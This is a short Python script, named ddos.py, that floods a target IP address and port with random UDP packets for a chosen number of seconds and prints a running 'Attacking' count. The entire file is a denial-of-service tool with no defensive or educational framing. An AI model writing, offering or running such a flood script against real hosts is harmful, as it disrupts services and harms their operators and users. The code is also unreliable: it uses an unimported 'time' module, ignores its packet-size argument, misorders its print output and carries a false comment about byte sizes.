import socket
import random
import os
import sys

def usage():
    print("Usage: python3 ddos.py <ip> <port> <packet size> <time>")
    sys.exit()

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print("Attacking %s sent packages %s at the port %s "%(sent, victim, vport))

def main():
    print(len(sys.argv))
    if len(sys.argv) != 5:
        usage()
    else:
        pass

    ip = sys.argv[1]
    port = int(sys.argv[2])
    dur = int(sys.argv[4])
    packet = int(sys.argv[3])

    flood(ip, port, dur)

if __name__ == '__main__':
    main()
